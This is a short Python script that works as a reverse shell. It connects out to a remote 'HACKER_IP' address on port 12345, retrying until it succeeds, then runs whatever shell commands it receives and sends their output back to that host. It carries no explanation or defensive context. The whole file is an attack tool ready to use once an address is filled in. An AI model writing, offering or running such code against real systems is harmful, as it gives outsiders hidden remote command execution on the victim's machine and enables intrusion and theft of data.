import subprocess
import socket

HACKER_IP = ""
HACKER_PORT = 12345

s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
connected = False
while not connected:
    try:
        s.connect((HACKER_IP , HACKER_PORT))
        connected = True
    except:
        continue
s.send("connected\n".encode())
while True:
    command = s.recv(1024)
    command = command.decode()
    if command == "exit\n":
        s.close()
        break
    proc = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    stdout_val = proc.stdout.read() + proc.stderr.read()
    s.send(stdout_val)

print("exit")
